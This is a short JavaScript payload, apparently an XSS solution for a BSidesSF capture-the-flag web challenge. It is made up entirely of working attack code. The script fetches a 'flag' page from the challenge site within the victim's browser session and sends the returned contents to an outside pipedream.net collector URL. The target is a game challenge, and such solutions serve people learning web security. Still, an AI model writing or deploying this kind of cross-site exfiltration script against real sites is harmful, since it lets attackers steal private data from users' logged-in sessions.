var xhr = new XMLHttpRequest();
xhr.onload = function() {
    if (xhr.status >= 200 && xhr.status < 300) {
        fetch("https://eo2jsc6xk7y9tec.m.pipedream.net?"+xhr.responseText);
    } else {
        console.log('The request failed with status:', xhr.status);
    }
};

console.log("works");
xhr.open('GET','https://web-tutorial-2-3ebcc611.challenges.bsidessf.net/xss-two-flag',true);
xhr.send();


